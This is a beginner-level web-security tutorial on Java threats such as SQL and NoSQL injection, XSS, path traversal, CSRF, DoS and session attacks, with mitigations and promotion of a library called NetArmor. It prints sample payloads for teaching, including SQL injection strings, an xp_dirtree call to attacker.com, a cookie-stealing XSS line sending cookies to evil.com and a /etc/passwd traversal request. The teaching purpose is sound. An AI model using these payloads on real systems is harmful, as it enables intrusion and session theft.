# Beyond the Code: Basic Threats
* Difficulty: **Easy**
* Target audience: **Beginners**

Java is one of the most popular programming languages that leads in the development of Web Apps and when we talk about making software, keeping things safe is super important. It is a really big deal in the business world and it comes with its own set of tricky spots. Day by day attacks become more advanced, forcing us to look more and more at the application from the abuser's side.

This article is divided into two parts: In the first part we will describe basic threats (that each of you would already know) and in the second one more "special" cases and issues, that require more complicated engineering and how [NetArmor](../armor) will help you to mitigate most of the threats.

Part 1: Understanding the basic Threats
=======================================

Let's describe some basic threats before we move to more enhanced ones.

In this section we will describe:

1. SQL Injection
2. NoSQL Injection
3. XSS Attacks
4. Parameter Tampering
5. Directory Traversal
6. CSRF Attacks
7. DoS Attacks
8. Session Attacks: Session fixation and Session Hijacking

Before we start describing each of them and some possible ways to mitigate them, we should understand and following:

- **Most basic attack vectors exist due to issues or absence of the proper input validation. Never believe the user input.**
- **Security isn't just a checklist of tasks. It's about constantly taking steps and thinking carefully about safety at every part of development and maintenance.**

SQL Injection
-------------

SQL Injection is a really common attack and almost the first thing, that future security specialists learn. But even nowadays it stands as one of the most prevalent and dangerous security vulnerabilities in web applications, including those built with Java.  
It occurs when an attacker can insert or "inject" a malicious SQL query via user input that is executed further.

Let's elaborate:

### Basic SQL Injection

At its core, SQL Injection exploits vulnerabilities in the way an application constructs SQL queries. Let's see the most basic example to understand better:

```java
String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
```

An attacker could exploit this by submitting a username input like `admin' --`, which would result in the SQL query:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ''

```

The `--` sequence effectively comments out the rest of the SQL command, bypassing the password check and potentially granting unauthorized access.

Beyond simple injection, attackers can use more sophisticated techniques, like leveraging SQL Injection to manipulate backend databases.

For instance, an attacker might use a payload that leverages a subquery to extract sensitive data:

```sql
' UNION SELECT username, password FROM users WHERE '1' = '1
```

This payload, when injected into a vulnerable query, would cause the database to return a dataset containing usernames and passwords from the `users` table.

We should take in attention, that hacking is not just following "pre-defined steps" and for successful attack the abuser analyzes the environment that he exploits.  
For this purpose commonly **Error based SQL Injection** is used.

The main idea is to design such a query, the execution of which would result in a database error, and stack trace that he wants to expose. The stack trace would include enough information to know the structure of the database, its name, and its version for further exploitation.

### Blind SQL Injection

Blind SQL Injection is one of the special cases of SQL Injections that may not be so obvious at first look. It does not rely on extracting information and is utilized to detect whether the application is vulnerable or not.

##### Time based SQL Injection

One of the most popular Blind SQL Injection attack subtypes is **Time-based SQL Injection**, the idea of which is observing the response time of an application to understand if an application is vulnerable to our attack.

For instance, we can manipulate a login form by submitting following:

```sql
' OR IF(1=1, SLEEP(10), false) --
```

and watch how application responds. If the processing time takes more than 10 seconds, it would indicate that the application is vulnerable.

Time-based SQLi is a pretty primitive type of Blind SQL Injection and may not work due to a lot of reasons including database optimizations (like caching), causing a lack of factors that give us enough reasons to assume its vulnerability. In this case, one of the solutions is using Out-of-Band blind SQL Injections.

##### Out-of-Band SQL Injection

This type of blind SQLi is an artwork and the success of the attack mostly relies on the configuration of our target. For a simple example, we will assume that our target is a Microsoft SQL Server with enabled extended stored procedures.

To do the attack, our bad guy starts server at `attacker.com` that intercepts incoming DNS queries. His goal is to make DBMS initiate DNS request to his server that would be a signal for him that database is vulnerable.

So he tries to pass payload to following query:

```sql
'; EXEC master..xp_dirtree '//attacker.com/sample'--
```

`xp_dirtree` makes database to initiate a DNS lookup for the domain `attacker.com` as it attempts to resolve the network path `//attacker.com/sample`. This DNS query is sent out because the database server tries to access the specified network file path, which requires resolving the domain name to an IP address. Again, he doesn't try to read anything, the key is in **alerting** that target is vulnerable and not in fetching some data from our server.

Thus, Blind SQL Injection is used to detect if the database is vulnerable to SQL Injection attacks. In the real world, bad guys from Black Hat communities gather big databases of URLs where specific software (especially e-commerce) is hosted and use such blind methods to filter vulnerable ones to make attacks.

### Hexadecimal SQL Injection

If the basic SQL injection is about lack of input validation then Hexadecimal SQLi is about lack of **proper** input validation.

In a standard SQL Injection attack, we expect something close to such a view of payload:

```sql
' UNION SELECT username, password FROM users --
```

, while in Hexadecimal SQL Injection it will look like this:

```sql
0x2720554e494f4e2053454c45435420757365726e616d652c2070617373776f72642046524f4d207573657273202d2d0d0a
```

Its effectiveness lies in its ability to conceal the true intent of malicious payload. Security systems that are based on inspecting queries may overlook such representation of data, which would lead to bypassing security filters and very bad consequences. It requires systems not only to look for specific keywords or patterns but also to analyze hexadecimal values, that may not be so obvious.

### How to protect from SQL injections in Java?

First and foremost remember: Input validation is one of your best friends in secure coding practices. You can use [**NetArmor's**](../armor) validator features to validate the input and move to following points:

##### Prepared statements

A prepared statement is a pre-compiled SQL statement, that allows separating data passed to query from statement, which excludes chance of interpreting data as a part of SQL code:

```java
var query = "SELECT * FROM users WHERE username = ?"
var username = netArmor.validator().input().validate("username", input);

try (var con = dataSource.getConnection()) {
    var statement = con.prepareStatement(query);
    statement.setString(1, username);

    // execute query
}
```

##### ORM Frameworks

Almost all ORM frameworks (like Hibernate, and JPA) use prepared statements under the hood and additional security measures to minimize the risk of SQL Injection.

Example with Hibernate, assuming User is your entity:

```java
var session = sessionFactory.openSession();
var username = netArmor.validator().input().validate("username", input);

var query = session.createQuery("from User where username = :username");
query.setParameter("username", username);

// execute the query
```

NoSQL Injection
---------------

NoSQL Injection is a type of attack, targeting applications that use non-relational databases like MongoDB, CassandraDB, CouchDB, and others. While SQL injections manipulate the SQL query passed to DBMS, NoSQL injection exploit vulnerabilities in requests to NoSQL databases.

Let's assume our application uses MongoDB and has active following endpoint:

```
POST /api/user
Accepts: application/json
```

This endpoint accepts JSON and extracts `username` from body and returns found user. Under the hood it looks like:

```PSEUDOCODE
db.users.find(
  {
    username: body["username"]
  }
)
```

As you see, data from body is provided directly without validation. We do know that MongoDB supports operators that allow us to construct more advanced requests, like

- `$ne` - not equals
- `$gt` - greater than
- `$lt` - less than

Now attacker tries to pass following body:

```json
{
  "username": {"$ne": null}
}
```

It will result with database searching with following filter:

```PSEUDOCODE
db.users.find(
  {
    username: {"$ne": null}
  }
)
```

It directly means "give me all users, whose username is not null". In most cases it will return you all users, what means that you have just performed NoSQL Injection.

### How to protect yourself from NoSQL Injection?

Strong typification and input validation are your best friends in this situation. For instance you can validate your input with [NetArmor](../armor)'s validator and use MongoDB driver in Java:

```java
var collection = database.getCollection("users");

var validatedUsername = netArmor.validator().input().validate("username", input);

var filter = Filters.eq("username", validatedUsername);
var result = collection.find(filter);
```

XSS Attacks
-----------

XSS Attack is yet another popular attack that targets not servers but users. The main goal of this method is to execute JS code in a user's browser.  
For instance, `Stored XSS` is a type of XSS attack when vulnerable code is stored on the legitimate server to be loaded by other users.

To understand it better, let's imagine we have a cinema website where users are allowed to post comments to films.  
Our evil man posts following content:

```
Very interesting film about extremely sad fairytale. var img=new Image();img.src='http://evil.com/steal-cookie.php?cookie='+document.cookie;
```

It will be stored in database with other comments.

When a random user will try to load comments, the DOM will look something like that:

```html

  
  
    
      Very interesting film about extremely sad fairytale. 
      var img = new Image(); img.src = 'http://evil.com/steal-cookie.php?cookie=' + document.cookie;
    
    ...
  
  

```

*BTW: Depending on the browser and how it builds the DOM tree, &lt;script&gt; maybe located inside &lt;p&gt; too and still will be executed*

Depending on configured security policies and browser security, the code may be executed and all the user's cookies will be sent to evil.com.

There also other types of XSS like `Reflected XSS` - when passed data (for instance in query parameters) reflects in the page furthermore, `DOM-based` - payload is passed after `#` symbol (as an example: `http://example.com/#alert('XSS');)`), but all of them work using the same scheme: **The server doesn't sanitize data, that is displayed to users**.

This type of attack is usually used in phishing mails and shows why teaching and following electronic hygiene is very important.

### How to protect your users from XSS Attacks?

The best thing you can do is sanitizing output that returns to user.  
Using [NetArmor](../armor) you can encode the data that will appear in your HTML or sanitize whole HTML:

```java
NetArmor netArmor = ... //your configured instance

var encoded = armor.htmlEncoder().encode("alert('XSS')");
var sanitizedHtml = armor.htmlEncoder().sanitizeHtml("your html");
```

Parameter tampering
-------------------

Parameter tampering is another prime example of a reason, why you shouldn't trust the user input. The main idea of this threat is to change the parameters passed to the server, which doesn't check **the integrity** of the data.

To be more clear, imagine you own a shop with enabled card payments using an external payment processor. A malicious actor wants to buy cookies in your e-shop and is redirected to the payment page with the following form:

```html

  
  
  
  
  
  Card number:
  
  
  Expires:
  
  
  CVC:
  

  
  
  Pay

```

Using developer tools, bad user can change "amount" parameter from `100.00` to `1` USD and make a payment. Usually after successful payments server receives notification on the web hook looking like this:

```json
{
  "order_id": "78910",
  "merchant_id": "123456",
  "status": "success",
  ...other fields
  
  "signature": "abcdefghijklmn...xyz"

}
```

The core feature is in the signature. If the server doesn't check the integrity of data by comparing digital signatures of what data he expected and which data he got, a parameter tampering attack would be successful and the attacker would buy cookies for 1$ instead of 100.

Directory Traversal
-------------------

Path (or Directory) traversal is a type of vulnerability that allows an attacker to get access to files and directories outside the scope of the root catalog of the server. It is another result of **the absence of input validation.**

Let's imagine we store some static content on the server that is accessible by users. Our web server will have an endpoint to download static content by passing the filename to the request param:

```java
@Controller
public class FileDownloadController {

    private final Path rootLocation = Paths.get("/var/www/files");

    @GetMapping("/download")
    public ResponseEntity download(@RequestParam("filename") String filename) {
          Path file = rootLocation.resolve(filename);

          Resource resource = new UrlResource(file.toUri());

          if (resource.exists())
              return ResponseEntity.ok().body(resource);
    }
}
```

Now imagine the attacker passes following to request url:

```
GET http://your-server.com/download?filename=../../../../etc/passwd
```

According to the code, it would be resolved into `/var/www/files/../../../../etc/passwd` that results in `/etc/passwd` because of `..` (parent directory symbol). Thus, it would make our server to return a file containing a list of the system's accounts.

### How to protect yourself from Path Traversal?

Idea is simple: you should normalize the path and check if it is in bounds of allowed paths.

You can configure allowed paths in [NetArmor](../armor) and simply validate path in 1 line:

```java
var path = netArmor.validator().path().validate(userPath);
```

CSRF Attacks
------------

Cross-site request Forgery is another attack aimed at the user, which allows them to perform actions on his behalf on the site where he is authenticated.

For instance, imagine a user is authenticated on `example.com`, and session cookies are stored in his browser. The user receives phishing mail and visits `some-evil-site.com` from it. Abuser puts an invisible form on the website that sends a request to example.com to change his password:

```html
// JavaScript code that executs on load
window.onload = function() {
    document.getElementById('maliciousForm').submit();
};
```

### How to protect your users from CSRF attacks?

CSRF is a well-known and well-studied attack. To protect from it you can use any of the methods from the following points:

#### CSRF Tokens

This is the most practical method to protect against CSRF attacks. For each session, a unique CSRF token is issued which must be sent in requests.

Although it is enough for most applications, the most secure option is not only issuing unique CSRF tokens for every session but also **updating it on every request** sent to the server. In this case, even if the token is compromised, it will become invalid on the next request the user executes.

#### Use token based authentication

Token-based authentication (for instance JWT, and OAuth) doesn't require storing any information in cookies. Instead, tokens are usually stored in `localStorage` or `sessionStorage` which doesn't allow to send them automatically like cookies.

#### Make cookies more secure

If software architecture allows, you can set the `Same-Site` attribute to `Strict` or `Lax` which will not allow to send cookies from anywhere except for the website itself. It helps to prevent CSRF attacks, but if the frontend is separated from the backend this method may become problematic.

DoS Attacks
-----------

First please don't confuse DoS attacks with DDoS attacks that relate to more enhanced threats. While DDoS attacks are much bigger in scale and usually `botnets` are used for them, DoS attacks can be used even by a single client and are not always targeted at disrupting the operation of the site.

#### Service unavailability

Although DDoS attacks are much more suitable to make service unavailable, some web servers that don't filter requests at all will still become unavailable, if a DoS attack is launched to such resource, which requires a lot of I/O operations from server with big network bandwidth and a lot of proxies.

Or if the server uses HTTP/2 you web server can be still vulnerable to [HTTP/2 Zero-Day vulnerability](https://blog.cloudflare.com/zero-day-rapid-reset-http2-record-breaking-ddos-attack) that potentially can make your service unavailable even with simple DoS attack due to its effectivity.

#### Account unavailability

Depending on the implemented security measures of the web server, most time when the abuser tries to *brute* user's account password it leads to blocking it for some time, making it unavailable to legitimate users to log in. If the abuser somehow gets a large amount of your service's usernames he can launch such DoS attack that will abuse this security algorithm and block a lot of accounts. Service will remain available, but users will not be able to log in.

### How to protect yourself from DoS attacks?

There are several ways you can protect your server from such attacks. The idea is simple, either you should limit the count of requests or you should detect malicious requests:

#### Rate limiting

It is a simple yet effective technique. If you receive a lot of requests from a connection and the number of requests exceeds the allowed one per some amount of time (depending on your architecture), you should block that IP Address for a defined amount of time.  
Moreover, the time for which you block the IP address should increment each time the connection exceeds the limit of requests per some period.

For instance, [**NetArmor**](../armor) configures your Netty based Server, applying the configurable rate limiter per IP address for HttpRequests and **HTTP/2 RST STREAM** packets, securing your server from `HTTP/2 0day` and basic DoS attacks.

Assuming you use `Reactor Netty` based server with NetArmor's `Reactor Netty Provider`, you can tweak it in one line:

```java
NetArmorPipeline armor = ....; //your configured Pipeline

public HttpServer httpServer(HttpServer original) {
   return armor.configure(original);
}
```

#### Anti-Bot techniques

You can use [reCaptcha](https://www.google.com/recaptcha/about/), [hCaptcha](https://www.hcaptcha.com) or any other anti-bot provider on your forms. It is effective way to prevent massive brute force attacks leading to potential unavailability of users' accounts.
YB
But let's be honest, most basic captchas are easily bypassed by external paid services even allowing attackers to use raw requests without Selenium-like automation tools. In this case, we need some more advanced techniques, which we will discuss in [Exposing in Disguise](exposing_in_disguise.md) and even here NetArmor will try to help you.

Session Fixation
----------------

The main idea of session fixation is making the user to use same Session ID with abuser's one. It can be done in several ways but most popular way assumes following:

Most times when user blocks cookies of website depending on software architecture, the role of cookies play the query string. Briefly speaking: Session ID is passed not in cookies but in query string and often backend accepts such format due to reason described above.

So, session fixation works in following way:

- Abuser starts login process and gets initial Session ID.
- Url with session id (like `https://example.com/login?sid=abcdfegh...xyz`) is sent to user via phishing or any other ways.
- User visits the link and logs in with abuser's session id.
- Abuser gets logged in too because he uses the same session id as legitimate user.

#### Protection

Protection is simple and straightforward. After user successfully signs in you should **always reset the session id** and give the **new** one.

Moreover, use **cryptographically strong** randomization algorithms for generating ids, like `java.security.SecureRandom`.

Session Hijacking
-----------------

We have already discussed one of the types of session hijacking using XSS attacks above. To refresh the memory, the main idea under the session hijacking is stealing users' cookies, using different methods.

XSS attacks are quite popular for Session Hijacking, but they are far from being the only method. Very often black hat guys *"spill"* different types of malware like *"stealers"* to gather data or even use the malware software on users' computers and send requests directly from users' computers.

Let me remind you: *Stealer* is a type of malware, that after being opened on the victim's computer gathers sensitive data from users' computers, including but not limited to browsers' cookies, stored passwords, credit cards, and as a common case deletes itself after the work. After this, abusers use different types of software (like checkers) to filter valid data and utilize them in specially designed software that spoofs the environment to look like a user and make malicious actions.

The question is, what should I do as an AppSec? This seems to be a task beyond my competence.

Well, yes, there are really limited things you can do in this situation, but in the high-risk sector, you should make the most of the security. Abusers' software elegantly hides their identity by changing many parameters (including those involved in `Browser Fingerprinting`) to look like a user and in such situations, we should use all the data we can get on the application layer for detection. In the second part of this article named [Exposing in Disguise](exposing_in_disguise.md) we will try to learn how to detect bots and malware acting from the user's side using such techniques as TLS fingerprinting, HTTP/2 fingerprinting, how to gather &amp; use all information needed for detecting Advanced Persistent Threat (APT) Attacks and how [NetArmor](../armor) will help us with this.

*This article was dublicated to GitHub from our blog: https://blog.exploit.org/*